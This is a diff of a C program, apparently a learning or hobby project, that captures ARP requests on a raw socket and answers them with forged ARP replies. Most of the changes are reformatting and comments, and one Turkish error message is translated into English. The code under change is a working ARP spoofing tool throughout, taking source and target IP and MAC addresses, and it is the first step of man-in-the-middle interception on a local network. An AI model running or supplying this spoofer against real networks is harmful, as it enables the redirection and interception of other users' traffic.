@@ -22,12 +22,16 @@
 
 static int running = 1;
 
-void signal_handler(int sig) {
+void signal_handler(int sig)
+{
     (void)sig;
     running = 0;
 }
 
-struct arp_header {
+/*	----------          struct          ----------	*/
+
+struct arp_header
+{
     uint16_t hw_type;
     uint16_t proto_type;
     uint8_t hw_size;
@@ -39,12 +43,15 @@ struct arp_header {
     uint8_t target_ip[4];
 };
 
-void mac_str_to_bytes(const char *str, uint8_t *mac) {
-    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+/*	--------------------------------------------	*/
+
+void mac_str_to_bytes(const char *str, uint8_t *mac)
+{
+    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
 }
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[])
+{
     if (argc != 5) {
         fprintf(stderr, "Usage: sudo %s <source_ip> <source_mac> <target_ip> <target_mac>\n", argv[0]);
         return EXIT_FAILURE;
@@ -62,20 +69,22 @@ int main(int argc, char *argv[]) {
     mac_str_to_bytes(target_mac_str, target_mac);
 
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-    if (sock < 0) {
+    if (sock < 0)
+    {
         perror("socket");
         return EXIT_FAILURE;
     }
 
-    // Interface
+    // interface
     char ifname[] = "enp0s3";
 
     printf("Listening on interface: %s\n", ifname);
 
     struct sockaddr_ll device = {0};
     device.sll_ifindex = if_nametoindex(ifname);
-    if (device.sll_ifindex == 0) {
-        fprintf(stderr, "Arayüz bulunamadı: %s\n", ifname);
+    if (device.sll_ifindex == 0)
+    {
+        fprintf(stderr, "Interface not found: %s\n", ifname);
         close(sock);
         return EXIT_FAILURE;
     }
@@ -83,31 +92,34 @@ int main(int argc, char *argv[]) {
     memcpy(device.sll_addr, target_mac, 6);
     device.sll_halen = 6;
 
-    while (running) {
+    printf("\n\tListening ARP packages from ip:\t%s (decimal)\n", target_ip);
+    printf("\tand MAC:\t\t\t%s\n\n", target_mac_str);
+
+    while (running)
+    {
         uint8_t buffer[ETH_HDR_LEN + ARP_PKT_LEN];
         ssize_t len = recv(sock, buffer, sizeof(buffer), 0);
         if (len < 0) continue;
 
         struct ether_header *eth = (struct ether_header *)buffer;
-        if (ntohs(eth->ether_type) != ETH_P_ARP) continue;
+        if (ntohs(eth->ether_type) != ETH_P_ARP) continue;	// is arp
 
         struct arp_header *arp = (struct arp_header *)(buffer + ETH_HDR_LEN);
-        if (ntohs(arp->opcode) != ARP_REQUEST) continue;
+        if (ntohs(arp->opcode) != ARP_REQUEST) continue;	// is req
 
         in_addr_t src_ip = inet_addr(source_ip);
         if (memcmp(arp->target_ip, &src_ip, 4) != 0) continue;
 
-        printf("Received ARP request from %d.%d.%d.%d\n",
-               arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);
+        printf("Received ARP request from %d.%d.%d.%d\n", arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);
 
-        // Construct ARP reply
+        // arp
         uint8_t packet[ETH_HDR_LEN + ARP_PKT_LEN] = {0};
         struct ether_header *eth_hdr = (struct ether_header *)packet;
         struct arp_header *arp_hdr = (struct arp_header *)(packet + ETH_HDR_LEN);
 
         memcpy(eth_hdr->ether_dhost, target_mac, 6);
         memcpy(eth_hdr->ether_shost, source_mac, 6);
-        eth_hdr->ether_type = htons(ETH_P_ARP);
+        eth_hdr->ether_type = htons(ETH_P_ARP);	// 0x0806
 
         arp_hdr->hw_type = htons(HW_TYPE_ETH);
         arp_hdr->proto_type = htons(PROTO_TYPE_IP);
@@ -120,10 +132,13 @@ int main(int argc, char *argv[]) {
         inet_pton(AF_INET, target_ip, arp_hdr->target_ip);
 
         printf("Sending spoofed ARP reply...\n");
-        if (sendto(sock, packet, sizeof(packet), 0,
-                   (struct sockaddr *)&device, sizeof(device)) < 0) {
+
+	if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&device, sizeof(device)) < 0)
+	{
             perror("sendto");
-        } else {
+        }
+	else
+	{
             printf("Spoofed ARP reply sent to %s\n", target_ip);
         }
 
